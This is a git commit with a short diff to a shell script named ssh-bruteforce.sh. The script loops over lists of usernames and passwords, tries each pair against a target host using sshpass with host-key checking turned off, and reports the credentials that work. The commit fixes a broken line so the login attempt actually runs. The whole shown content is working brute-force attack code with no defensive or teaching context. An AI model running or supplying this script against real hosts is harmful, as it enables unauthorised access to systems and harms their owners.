58e2b927bedfa88a22b9df4f68f308153c9670ba
Moshe Rivkin <m0535541179@gmail.com>
2023-12-28 15:16:51 +0200

    222

--- ssh-bruteforce.sh
+++ ssh-bruteforce.sh
@@ -13,8 +13,7 @@ while IFS= read -r line
 do
     while IFS= read -r line2
     do
-        test=sshpass -p "$line2" ssh -o StrictHostKeyChecking=no "$line"@"$1"
-        echo $test
+        sshpass -p "$line2" ssh -o StrictHostKeyChecking=no "$line"@"$1"
         if [ $? -ne 5 ]; then
             echo "found user: $line and password: $line2"
             break
